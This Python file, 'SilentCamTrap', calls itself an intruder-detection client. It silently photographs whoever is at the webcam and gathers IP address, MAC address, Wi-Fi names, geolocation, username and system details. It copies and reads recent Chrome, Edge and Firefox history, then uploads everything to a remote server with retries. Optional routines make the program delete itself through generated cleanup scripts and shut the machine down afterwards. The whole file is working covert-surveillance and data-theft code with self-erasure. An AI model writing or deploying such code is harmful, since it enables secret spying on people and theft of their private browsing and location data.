#!/usr/bin/env python3
"""
SilentCamTrap - Intruder Detection Client
==========================================
A comprehensive security monitoring tool that captures intruder data
including webcam images, system information, and browser history.

Author: Mahmud Rahman (https://github.com/mahmud-r-farhan)
License: MIT
"""

import cv2
import os
import sys
import time
import json
import socket
import sqlite3
import logging
import platform
import subprocess
import configparser
import tempfile
import locale
import getpass
from pathlib import Path
from datetime import datetime, timezone
from dataclasses import dataclass, asdict, field
from typing import Dict, List, Optional, Any, Tuple
from contextlib import contextmanager
from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError as FuturesTimeoutError

try:
    import requests
    import geocoder
except ImportError as e:
    print(f"Missing required package: {e}")
    print("Install with: pip install requests geocoder opencv-python psutil")
    sys.exit(1)

# Optional imports — fail gracefully
try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

try:
    import ctypes
    CTYPES_AVAILABLE = True
except ImportError:
    CTYPES_AVAILABLE = False


# =============================================================================
# Configuration
# =============================================================================

@dataclass
class Config:
    """Application configuration settings."""
    api_url: str = 'http://localhost:3000/api/upload'
    api_key: str = 'default-api-key'
    log_folder: str = 'intruder_logs'
    webcam_index: int = 0
    webcam_warmup_seconds: float = 0.8
    webcam_frame_count: int = 10        # capture N frames, pick sharpest
    connection_timeout: int = 30
    send_retries: int = 3               # retry attempts on failure
    send_retry_delay: float = 2.0       # seconds (doubles each retry)
    collection_timeout: int = 20        # max seconds for parallel collectors
    enable_shutdown: bool = False        # Safety: disabled by default
    enable_self_delete: bool = False     # Safety: disabled by default
    enable_browser_history: bool = True
    max_browser_history: int = 10
    log_level: str = 'INFO'

    @classmethod
    def from_file(cls, config_path: str = 'config.json') -> 'Config':
        """Load configuration from JSON file if exists."""
        config = cls()
        if os.path.exists(config_path):
            try:
                with open(config_path, 'r') as f:
                    data = json.load(f)
                    for key, value in data.items():
                        if hasattr(config, key):
                            setattr(config, key, value)
            except Exception as e:
                logging.warning(f"Failed to load config: {e}")
        return config

    def to_file(self, config_path: str = 'config.json') -> None:
        """Save configuration to JSON file."""
        with open(config_path, 'w') as f:
            json.dump(asdict(self), f, indent=2)


# =============================================================================
# Logging Setup
# =============================================================================

def setup_logging(config: Config) -> logging.Logger:
    """Configure application logging."""
    log_format = '%(asctime)s - %(levelname)s - %(message)s'
    os.makedirs(config.log_folder, exist_ok=True)
    logging.basicConfig(
        level=getattr(logging, config.log_level.upper(), logging.INFO),
        format=log_format,
        handlers=[
            logging.FileHandler(
                os.path.join(config.log_folder, 'client.log'),
                mode='a',
                encoding='utf-8'
            )
        ]
    )
    return logging.getLogger(__name__)


# =============================================================================
# Data Models
# =============================================================================

@dataclass
class LocationData:
    """Geographic location information."""
    latitude: Optional[float] = None
    longitude: Optional[float] = None
    city: Optional[str] = None
    state: Optional[str] = None
    country: Optional[str] = None
    country_code: Optional[str] = None
    postal: Optional[str] = None
    timezone: Optional[str] = None
    isp: Optional[str] = None
    org: Optional[str] = None
    error: Optional[str] = None


@dataclass
class NetworkData:
    """Network information."""
    public_ip: str = ""
    local_ip: str = ""
    hostname: str = ""
    mac_address: str = ""
    wifi_ssid: Optional[str] = None
    nearby_networks: List[str] = field(default_factory=list)
    open_ports: List[int] = field(default_factory=list)
    error: Optional[str] = None


@dataclass
class SystemData:
    """System information."""
    os_name: str = ""
    os_version: str = ""
    os_release: str = ""
    machine: str = ""
    processor: str = ""
    cpu_count: int = 0
    cpu_freq_mhz: Optional[float] = None
    ram_total_gb: Optional[float] = None
    ram_available_gb: Optional[float] = None
    disk_total_gb: Optional[float] = None
    disk_free_gb: Optional[float] = None
    python_version: str = ""
    username: str = ""
    home_dir: str = ""
    screen_width: Optional[int] = None
    screen_height: Optional[int] = None
    locale_info: str = ""
    system_timezone: str = ""
    battery_percent: Optional[float] = None
    battery_plugged: Optional[bool] = None
    uptime_seconds: Optional[float] = None
    running_processes: int = 0


@dataclass
class BrowserHistoryEntry:
    """Single browser history entry."""
    url: str
    title: Optional[str]
    timestamp: Optional[int]


@dataclass
class IntruderData:
    """Complete intruder data package."""
    capture_time: str
    network: NetworkData
    location: LocationData
    system: SystemData
    browser_histories: Dict[str, Any]
    image_path: Optional[str] = None


# =============================================================================
# Data Collectors
# =============================================================================

class NetworkCollector:
    """Collects network-related information."""

    @staticmethod
    def get_public_ip(timeout: int = 10) -> str:
        """Get public IP address using multiple fallback services."""
        services = [
            'https://api.ipify.org',
            'https://icanhazip.com',
            'https://checkip.amazonaws.com',
            'https://api.my-ip.io/ip',
        ]
        for service in services:
            try:
                response = requests.get(service, timeout=timeout)
                if response.status_code == 200:
                    return response.text.strip()
            except requests.RequestException:
                continue
        return "Unknown"

    @staticmethod
    def get_local_ip() -> str:
        """Get local network IP address."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except Exception:
            try:
                return socket.gethostbyname(socket.gethostname())
            except Exception:
                return "Unknown"

    @staticmethod
    def get_hostname() -> str:
        """Get system hostname."""
        try:
            return socket.gethostname()
        except Exception:
            return "Unknown"

    @staticmethod
    def get_mac_address() -> str:
        """Get primary network adapter MAC address."""
        try:
            import uuid
            mac = uuid.getnode()
            return ':'.join(('%012X' % mac)[i:i+2] for i in range(0, 12, 2))
        except Exception:
            return "Unknown"

    @staticmethod
    def get_wifi_ssid() -> Optional[str]:
        """Get currently connected Wi-Fi SSID."""
        system = platform.system()
        try:
            if system == 'Windows':
                result = subprocess.run(
                    ['netsh', 'wlan', 'show', 'interfaces'],
                    capture_output=True, text=True, timeout=5,
                    creationflags=getattr(subprocess, 'CREATE_NO_WINDOW', 0)
                )
                for line in result.stdout.splitlines():
                    if 'SSID' in line and 'BSSID' not in line:
                        parts = line.split(':', 1)
                        if len(parts) == 2:
                            return parts[1].strip()
            elif system == 'Darwin':
                result = subprocess.run(
                    ['/System/Library/PrivateFrameworks/Apple80211.framework'
                     '/Versions/Current/Resources/airport', '-I'],
                    capture_output=True, text=True, timeout=5
                )
                for line in result.stdout.splitlines():
                    if ' SSID:' in line:
                        return line.split(':', 1)[1].strip()
            else:
                result = subprocess.run(
                    ['iwgetid', '-r'],
                    capture_output=True, text=True, timeout=5
                )
                ssid = result.stdout.strip()
                return ssid if ssid else None
        except Exception:
            pass
        return None

    @staticmethod
    def get_nearby_networks() -> List[str]:
        """Get list of visible Wi-Fi SSIDs (Windows only)."""
        if platform.system() != 'Windows':
            return []
        try:
            result = subprocess.run(
                ['netsh', 'wlan', 'show', 'networks', 'mode=bssid'],
                capture_output=True, text=True, timeout=8,
                creationflags=getattr(subprocess, 'CREATE_NO_WINDOW', 0)
            )
            networks = []
            for line in result.stdout.splitlines():
                if 'SSID' in line and 'BSSID' not in line:
                    parts = line.split(':', 1)
                    if len(parts) == 2:
                        ssid = parts[1].strip()
                        if ssid:
                            networks.append(ssid)
            return list(dict.fromkeys(networks))[:15]  # dedupe, max 15
        except Exception:
            return []

    @classmethod
    def collect(cls, timeout: int = 10) -> NetworkData:
        """Collect all network data."""
        return NetworkData(
            public_ip=cls.get_public_ip(timeout),
            local_ip=cls.get_local_ip(),
            hostname=cls.get_hostname(),
            mac_address=cls.get_mac_address(),
            wifi_ssid=cls.get_wifi_ssid(),
            nearby_networks=cls.get_nearby_networks(),
        )


class LocationCollector:
    """Collects geographic location information via IP geolocation."""

    @staticmethod
    def collect() -> LocationData:
        """Get approximate location from IP address (two-provider fallback)."""
        # Primary: geocoder
        try:
            g = geocoder.ip('me')
            if g.ok:
                return LocationData(
                    latitude=g.lat,
                    longitude=g.lng,
                    city=g.city,
                    state=g.state,
                    country=g.country,
                    country_code=g.country_long if hasattr(g, 'country_long') else None,
                    postal=g.postal if hasattr(g, 'postal') else None,
                    timezone=g.timezone if hasattr(g, 'timezone') else None,
                    isp=g.org if hasattr(g, 'org') else None,
                )
        except Exception:
            pass

        # Fallback: ip-api.com
        try:
            resp = requests.get('http://ip-api.com/json/', timeout=8)
            if resp.status_code == 200:
                d = resp.json()
                if d.get('status') == 'success':
                    return LocationData(
                        latitude=d.get('lat'),
                        longitude=d.get('lon'),
                        city=d.get('city'),
                        state=d.get('regionName'),
                        country=d.get('country'),
                        country_code=d.get('countryCode'),
                        postal=d.get('zip'),
                        timezone=d.get('timezone'),
                        isp=d.get('isp'),
                        org=d.get('org'),
                    )
        except Exception:
            pass

        return LocationData(error="Unable to determine location")


class SystemCollector:
    """Collects comprehensive system information."""

    @staticmethod
    def _get_screen_resolution() -> Tuple[Optional[int], Optional[int]]:
        """Get primary screen resolution."""
        system = platform.system()
        try:
            if system == 'Windows' and CTYPES_AVAILABLE:
                user32 = ctypes.windll.user32
                w = user32.GetSystemMetrics(0)
                h = user32.GetSystemMetrics(1)
                if w > 0 and h > 0:
                    return w, h
            elif system == 'Darwin':
                result = subprocess.run(
                    ['system_profiler', 'SPDisplaysDataType'],
                    capture_output=True, text=True, timeout=5
                )
                for line in result.stdout.splitlines():
                    if 'Resolution' in line:
                        parts = line.split(':')[1].strip().split(' x ')
                        if len(parts) >= 2:
                            return int(parts[0]), int(parts[1].split()[0])
            else:
                result = subprocess.run(
                    ['xdpyinfo'], capture_output=True, text=True, timeout=5
                )
                for line in result.stdout.splitlines():
                    if 'dimensions:' in line:
                        dims = line.split(':')[1].strip().split()[0].split('x')
                        if len(dims) == 2:
                            return int(dims[0]), int(dims[1])
        except Exception:
            pass
        return None, None

    @staticmethod
    def _get_battery() -> Tuple[Optional[float], Optional[bool]]:
        """Get battery percentage and charging state."""
        if not PSUTIL_AVAILABLE:
            return None, None
        try:
            bat = psutil.sensors_battery()
            if bat:
                return round(bat.percent, 1), bat.power_plugged
        except Exception:
            pass
        return None, None

    @staticmethod
    def _get_uptime() -> Optional[float]:
        """Get system uptime in seconds."""
        if not PSUTIL_AVAILABLE:
            return None
        try:
            return time.time() - psutil.boot_time()
        except Exception:
            return None

    @staticmethod
    def _get_process_count() -> int:
        """Get number of running processes."""
        if not PSUTIL_AVAILABLE:
            return 0
        try:
            return len(list(psutil.pids()))
        except Exception:
            return 0

    @staticmethod
    def _get_memory_info() -> Tuple[Optional[float], Optional[float]]:
        """Get total and available RAM in GB."""
        if not PSUTIL_AVAILABLE:
            return None, None
        try:
            mem = psutil.virtual_memory()
            return round(mem.total / 1e9, 2), round(mem.available / 1e9, 2)
        except Exception:
            return None, None

    @staticmethod
    def _get_disk_info() -> Tuple[Optional[float], Optional[float]]:
        """Get total and free disk space in GB."""
        if not PSUTIL_AVAILABLE:
            return None, None
        try:
            disk = psutil.disk_usage('/')
            return round(disk.total / 1e9, 2), round(disk.free / 1e9, 2)
        except Exception:
            return None, None

    @staticmethod
    def _get_cpu_info() -> Tuple[int, Optional[float]]:
        """Get CPU count and frequency."""
        count = os.cpu_count() or 0
        freq = None
        if PSUTIL_AVAILABLE:
            try:
                f = psutil.cpu_freq()
                if f:
                    freq = round(f.current, 1)
            except Exception:
                pass
        return count, freq

    @classmethod
    def collect(cls) -> SystemData:
        """Gather comprehensive system information."""
        screen_w, screen_h = cls._get_screen_resolution()
        battery_pct, battery_plugged = cls._get_battery()
        uptime = cls._get_uptime()
        processes = cls._get_process_count()
        ram_total, ram_avail = cls._get_memory_info()
        disk_total, disk_free = cls._get_disk_info()
        cpu_count, cpu_freq = cls._get_cpu_info()

        try:
            locale_info = locale.getdefaultlocale()[0] or ''
        except Exception:
            locale_info = ''

        try:
            sys_tz = str(datetime.now(timezone.utc).astimezone().tzname())
        except Exception:
            sys_tz = ''

        try:
            username = getpass.getuser()
        except Exception:
            username = os.environ.get('USERNAME', os.environ.get('USER', 'Unknown'))

        return SystemData(
            os_name=platform.system(),
            os_version=platform.version(),
            os_release=platform.release(),
            machine=platform.machine(),
            processor=platform.processor(),
            cpu_count=cpu_count,
            cpu_freq_mhz=cpu_freq,
            ram_total_gb=ram_total,
            ram_available_gb=ram_avail,
            disk_total_gb=disk_total,
            disk_free_gb=disk_free,
            python_version=platform.python_version(),
            username=username,
            home_dir=str(Path.home()),
            screen_width=screen_w,
            screen_height=screen_h,
            locale_info=locale_info,
            system_timezone=sys_tz,
            battery_percent=battery_pct,
            battery_plugged=battery_plugged,
            uptime_seconds=round(uptime, 1) if uptime else None,
            running_processes=processes,
        )


class BrowserHistoryCollector:
    """Collects browser history from Chrome and Firefox."""

    def __init__(self, max_entries: int = 10):
        self.max_entries = max_entries
        self.is_windows = platform.system() == 'Windows'

    @contextmanager
    def _temp_db_copy(self, source_path: str):
        """Context manager for safely copying and cleaning up database files."""
        fd, temp_path = tempfile.mkstemp(suffix='.db')
        os.close(fd)
        try:
            if os.path.exists(source_path):
                with open(source_path, 'rb') as src, open(temp_path, 'wb') as dst:
                    dst.write(src.read())
                yield temp_path
            else:
                yield None
        finally:
            try:
                os.remove(temp_path)
            except Exception:
                pass

    def _get_chrome_path(self) -> str:
        """Get Chrome history database path based on OS."""
        if self.is_windows:
            return os.path.expanduser(
                r'~\AppData\Local\Google\Chrome\User Data\Default\History'
            )
        elif platform.system() == 'Darwin':
            return os.path.expanduser(
                '~/Library/Application Support/Google/Chrome/Default/History'
            )
        return os.path.expanduser('~/.config/google-chrome/Default/History')

    def _get_edge_path(self) -> str:
        """Get Edge history database path (Windows)."""
        return os.path.expanduser(
            r'~\AppData\Local\Microsoft\Edge\User Data\Default\History'
        )

    def _get_firefox_profile_path(self) -> Optional[str]:
        """Get Firefox profile path based on OS."""
        if self.is_windows:
            base = os.path.expanduser(r'~\AppData\Roaming\Mozilla\Firefox')
        elif platform.system() == 'Darwin':
            base = os.path.expanduser('~/Library/Application Support/Firefox')
        else:
            base = os.path.expanduser('~/.mozilla/firefox')

        profiles_ini = os.path.join(base, 'profiles.ini')
        if not os.path.exists(profiles_ini):
            return None

        config = configparser.ConfigParser()
        config.read(profiles_ini)

        for section in config.sections():
            if config.has_option(section, 'Default') and config.get(section, 'Default') == '1':
                profile_path = config.get(section, 'Path')
                if config.has_option(section, 'IsRelative') and config.get(section, 'IsRelative') == '1':
                    return os.path.join(base, profile_path, 'places.sqlite')
                return os.path.join(profile_path, 'places.sqlite')

        # Fallback: try first Profile section
        for section in config.sections():
            if section.startswith('Profile'):
                profile_path = config.get(section, 'Path', fallback=None)
                if profile_path:
                    if config.has_option(section, 'IsRelative') and config.get(section, 'IsRelative') == '1':
                        return os.path.join(base, profile_path, 'places.sqlite')
                    return os.path.join(profile_path, 'places.sqlite')
        return None

    def _read_chromium_history(self, db_path: str, browser_name: str) -> Dict[str, Any]:
        """Generic Chromium-based browser history reader."""
        try:
            with self._temp_db_copy(db_path) as temp_db:
                if not temp_db:
                    return {'error': f'{browser_name} history database not found'}

                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("""
                    SELECT url, title, last_visit_time
                    FROM urls
                    ORDER BY last_visit_time DESC
                    LIMIT ?
                """, (self.max_entries,))

                history = [
                    asdict(BrowserHistoryEntry(url=row[0], title=row[1], timestamp=row[2]))
                    for row in cursor.fetchall()
                ]
                conn.close()
                return history if history else {'info': f'No {browser_name} history found'}

        except sqlite3.OperationalError as e:
            return {'error': f'{browser_name} database locked or corrupted: {e}'}
        except Exception as e:
            return {'error': str(e)}

    def collect_chrome(self) -> Dict[str, Any]:
        """Collect Chrome browser history."""
        return self._read_chromium_history(self._get_chrome_path(), 'Chrome')

    def collect_edge(self) -> Dict[str, Any]:
        """Collect Microsoft Edge browser history (Windows)."""
        if not self.is_windows:
            return {'info': 'Edge not available on this OS'}
        return self._read_chromium_history(self._get_edge_path(), 'Edge')

    def collect_firefox(self) -> Dict[str, Any]:
        """Collect Firefox browser history."""
        try:
            firefox_path = self._get_firefox_profile_path()
            if not firefox_path:
                return {'error': 'Firefox profile not found'}

            with self._temp_db_copy(firefox_path) as temp_db:
                if not temp_db:
                    return {'error': 'Firefox history database not found'}

                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("""
                    SELECT url, title, last_visit_date
                    FROM moz_places
                    WHERE last_visit_date IS NOT NULL
                    ORDER BY last_visit_date DESC
                    LIMIT ?
                """, (self.max_entries,))

                history = [
                    asdict(BrowserHistoryEntry(url=row[0], title=row[1], timestamp=row[2]))
                    for row in cursor.fetchall()
                ]
                conn.close()
                return history if history else {'info': 'No Firefox history found'}

        except sqlite3.OperationalError as e:
            return {'error': f'Firefox database locked or corrupted: {e}'}
        except Exception as e:
            return {'error': str(e)}

    def collect_all(self) -> Dict[str, Any]:
        """Collect history from all supported browsers in parallel."""
        browsers = {
            'chrome': self.collect_chrome,
            'firefox': self.collect_firefox,
            'edge': self.collect_edge,
        }
        results = {}
        with ThreadPoolExecutor(max_workers=3) as executor:
            futures = {executor.submit(fn): name for name, fn in browsers.items()}
            for future in as_completed(futures, timeout=15):
                name = futures[future]
                try:
                    results[name] = future.result()
                except Exception as e:
                    results[name] = {'error': str(e)}
        return results


# =============================================================================
# Webcam Capture — sharpest frame selection
# =============================================================================

class WebcamCapture:
    """Handles webcam image capture with sharpness-based frame selection."""

    def __init__(self, camera_index: int = 0, warmup_time: float = 0.8,
                 frame_count: int = 10):
        self.camera_index = camera_index
        self.warmup_time = warmup_time
        self.frame_count = frame_count
        self.cap = None

    def __enter__(self):
        self.cap = cv2.VideoCapture(self.camera_index)
        if self.cap.isOpened():
            # Set higher resolution if supported
            self.cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
            self.cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
            time.sleep(self.warmup_time)
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        if self.cap:
            self.cap.release()

    @staticmethod
    def _sharpness(frame) -> float:
        """Measure frame sharpness via Laplacian variance (higher = sharper)."""
        gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
        return cv2.Laplacian(gray, cv2.CV_64F).var()

    def capture(self) -> Optional[Any]:
        """Capture multiple frames and return the sharpest one."""
        if not self.cap or not self.cap.isOpened():
            return None

        candidates = []
        for _ in range(self.frame_count):
            ret, frame = self.cap.read()
            if ret and frame is not None:
                score = self._sharpness(frame)
                candidates.append((score, frame))

        if not candidates:
            return None

        # Return frame with highest sharpness score
        candidates.sort(key=lambda x: x[0], reverse=True)
        return candidates[0][1]

    def save_image(self, frame: Any, output_dir: str) -> Optional[str]:
        """Save captured frame to file with high JPEG quality."""
        if frame is None:
            return None

        os.makedirs(output_dir, exist_ok=True)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(output_dir, f"intruder_{timestamp}.jpg")
        cv2.imwrite(filename, frame, [cv2.IMWRITE_JPEG_QUALITY, 95])
        return filename


# =============================================================================
# Data Sender — retry with exponential backoff
# =============================================================================

class DataSender:
    """Handles sending collected data to the server with retry logic."""

    def __init__(self, api_url: str, api_key: str, timeout: int = 30,
                 retries: int = 3, retry_delay: float = 2.0):
        self.api_url = api_url
        self.api_key = api_key
        self.timeout = timeout
        self.retries = retries
        self.retry_delay = retry_delay

    def send(self, image_path: str, data: Dict[str, Any]) -> bool:
        """Send image and data to the server with exponential backoff retries."""
        headers = {'X-API-KEY': self.api_key}
        delay = self.retry_delay

        for attempt in range(1, self.retries + 1):
            try:
                with open(image_path, 'rb') as image_file:
                    files = {
                        'file': (os.path.basename(image_path), image_file, 'image/jpeg'),
                        'data': ('data.json', json.dumps(data, default=str), 'application/json')
                    }
                    response = requests.post(
                        self.api_url,
                        files=files,
                        headers=headers,
                        timeout=self.timeout
                    )

                if response.status_code == 200:
                    return True

                logging.warning(f"Attempt {attempt}/{self.retries}: server returned {response.status_code}")

            except requests.ConnectionError:
                logging.warning(f"Attempt {attempt}/{self.retries}: connection failed to {self.api_url}")
            except requests.Timeout:
                logging.warning(f"Attempt {attempt}/{self.retries}: request timed out")
            except Exception as e:
                logging.warning(f"Attempt {attempt}/{self.retries}: {e}")

            if attempt < self.retries:
                time.sleep(delay)
                delay *= 2  # exponential backoff

        logging.error(f"All {self.retries} send attempts failed")
        return False


# =============================================================================
# Post-Success Actions
# =============================================================================

class PostSuccessActions:
    """Handles optional actions after successful data transmission."""

    def __init__(self, enable_shutdown: bool = False, enable_self_delete: bool = False):
        self.enable_shutdown = enable_shutdown
        self.enable_self_delete = enable_self_delete
        self.is_windows = platform.system() == 'Windows'

    def execute(self) -> None:
        """Execute post-success actions if enabled."""
        if self.enable_self_delete:
            self._schedule_self_delete()
        if self.enable_shutdown:
            self._schedule_shutdown()

    def _schedule_self_delete(self) -> None:
        """Schedule deletion of the executable."""
        exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
        if self.is_windows:
            self._windows_self_delete(exe_path)
        else:
            self._unix_self_delete(exe_path)

    def _windows_self_delete(self, exe_path: str) -> None:
        """Windows-specific self-deletion using batch file."""
        bat_path = os.path.join(os.path.dirname(exe_path), 'cleanup.bat')
        script_content = (
            f'@echo off\r\n'
            f'timeout /t 3 /nobreak >nul\r\n'
            f'del /f /q "{exe_path}"\r\n'
            f'del /f /q "{bat_path}"\r\n'
        )
        with open(bat_path, 'w') as f:
            f.write(script_content)
        subprocess.Popen(
            ['cmd', '/c', bat_path],
            shell=False,
            creationflags=subprocess.CREATE_NO_WINDOW
        )

    def _unix_self_delete(self, exe_path: str) -> None:
        """Unix-specific self-deletion using shell script."""
        sh_path = os.path.join(os.path.dirname(exe_path), 'cleanup.sh')
        script_content = f'#!/bin/bash\nsleep 3\nrm -f "{exe_path}"\nrm -f "{sh_path}"\n'
        with open(sh_path, 'w') as f:
            f.write(script_content)
        os.chmod(sh_path, 0o755)
        subprocess.Popen(['sh', sh_path], shell=False)

    def _schedule_shutdown(self) -> None:
        """Schedule system shutdown."""
        if self.is_windows:
            subprocess.Popen(['shutdown', '/s', '/t', '5'], shell=False)
        else:
            subprocess.Popen(['shutdown', '-h', '+1'], shell=False)


# =============================================================================
# Main Application
# =============================================================================

class SilentCamTrap:
    """Main application orchestrator."""

    def __init__(self, config: Config):
        self.config = config
        self.logger = setup_logging(config)

    def collect_all_data(self) -> IntruderData:
        """Collect all intruder data concurrently for speed."""
        self.logger.info("Starting parallel data collection...")

        results = {}
        tasks = {
            'network': lambda: NetworkCollector.collect(self.config.connection_timeout),
            'location': LocationCollector.collect,
            'system': SystemCollector.collect,
        }

        if self.config.enable_browser_history:
            collector = BrowserHistoryCollector(self.config.max_browser_history)
            tasks['browser'] = collector.collect_all

        with ThreadPoolExecutor(max_workers=len(tasks)) as executor:
            futures = {executor.submit(fn): name for name, fn in tasks.items()}
            try:
                for future in as_completed(futures, timeout=self.config.collection_timeout):
                    name = futures[future]
                    try:
                        results[name] = future.result()
                        self.logger.debug(f"Collected: {name}")
                    except Exception as e:
                        self.logger.warning(f"Collection failed [{name}]: {e}")
            except FuturesTimeoutError:
                self.logger.warning("Some collectors timed out — using partial results")

        return IntruderData(
            capture_time=datetime.now().isoformat(),
            network=results.get('network', NetworkData(error='Collection failed')),
            location=results.get('location', LocationData(error='Collection failed')),
            system=results.get('system', SystemData()),
            browser_histories=results.get('browser', {}),
        )

    def capture_image(self) -> Optional[str]:
        """Capture webcam image — picks sharpest frame."""
        self.logger.info("Capturing webcam image (sharpest frame selection)...")

        with WebcamCapture(
            self.config.webcam_index,
            self.config.webcam_warmup_seconds,
            self.config.webcam_frame_count
        ) as webcam:
            frame = webcam.capture()

            if frame is None:
                self.logger.error("Failed to capture webcam image")
                return None

            image_path = webcam.save_image(frame, self.config.log_folder)
            if image_path:
                self.logger.info(f"Image saved: {image_path}")
            return image_path

    def run(self) -> bool:
        """Execute the main application workflow."""
        try:
            os.makedirs(self.config.log_folder, exist_ok=True)

            # Capture and collect concurrently
            with ThreadPoolExecutor(max_workers=2) as executor:
                img_future = executor.submit(self.capture_image)
                data_future = executor.submit(self.collect_all_data)

                image_path = img_future.result()
                data = data_future.result()

            if not image_path:
                self.logger.error("Image capture failed. Aborting.")
                return False

            data.image_path = image_path

            # Build payload dict
            data_dict = {
                'capture_time': data.capture_time,
                'network': asdict(data.network),
                'location': asdict(data.location),
                'system': asdict(data.system),
                'browser_histories': data.browser_histories,
            }

            # Send with retry
            self.logger.info("Sending data to server...")
            sender = DataSender(
                api_url=self.config.api_url,
                api_key=self.config.api_key,
                timeout=self.config.connection_timeout,
                retries=self.config.send_retries,
                retry_delay=self.config.send_retry_delay,
            )

            if sender.send(image_path, data_dict):
                self.logger.info("Data sent successfully!")
                PostSuccessActions(
                    self.config.enable_shutdown,
                    self.config.enable_self_delete
                ).execute()
                return True
            else:
                self.logger.error("Failed to send data to server after all retries")
                return False

        except Exception as e:
            self.logger.exception(f"Application error: {e}")
            return False


# =============================================================================
# Entry Point
# =============================================================================

def main():
    """Application entry point."""
    config = Config.from_file()

    # Override with environment variables if present
    env_map = {
        'SILENTCAMTRAP_API_URL': 'api_url',
        'SILENTCAMTRAP_API_KEY': 'api_key',
        'SILENTCAMTRAP_ENABLE_SHUTDOWN': None,
        'SILENTCAMTRAP_ENABLE_DELETE': None,
    }
    if os.environ.get('SILENTCAMTRAP_API_URL'):
        config.api_url = os.environ['SILENTCAMTRAP_API_URL']
    if os.environ.get('SILENTCAMTRAP_API_KEY'):
        config.api_key = os.environ['SILENTCAMTRAP_API_KEY']
    if os.environ.get('SILENTCAMTRAP_ENABLE_SHUTDOWN'):
        config.enable_shutdown = os.environ['SILENTCAMTRAP_ENABLE_SHUTDOWN'].lower() == 'true'
    if os.environ.get('SILENTCAMTRAP_ENABLE_DELETE'):
        config.enable_self_delete = os.environ['SILENTCAMTRAP_ENABLE_DELETE'].lower() == 'true'

    app = SilentCamTrap(config)
    success = app.run()

    time.sleep(0.5)
    sys.exit(0 if success else 1)


if __name__ == '__main__':
    main()